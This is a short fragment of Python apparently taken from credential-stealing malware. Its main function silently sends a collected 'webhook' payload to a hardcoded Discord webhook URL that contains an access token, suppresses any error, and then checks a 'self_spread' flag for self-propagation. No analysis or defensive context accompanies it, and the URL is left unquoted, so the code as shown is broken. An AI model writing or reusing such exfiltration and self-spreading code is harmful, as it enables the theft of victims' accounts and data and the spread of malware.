...
def main():
	...
	try:
		urlopen(Request(https://discordapp.com/api/webhooks/1403541140031930561/pbE34Qyyq84K_fsz6Hqbq5GPsySH3jvY7RHeteARNLQTU-Yhbm6JImVkhbh6mgIbVDbD, data=dumps(webhook).encode(), headers=getheaders()))
	except:
		pass
	if self_spread:
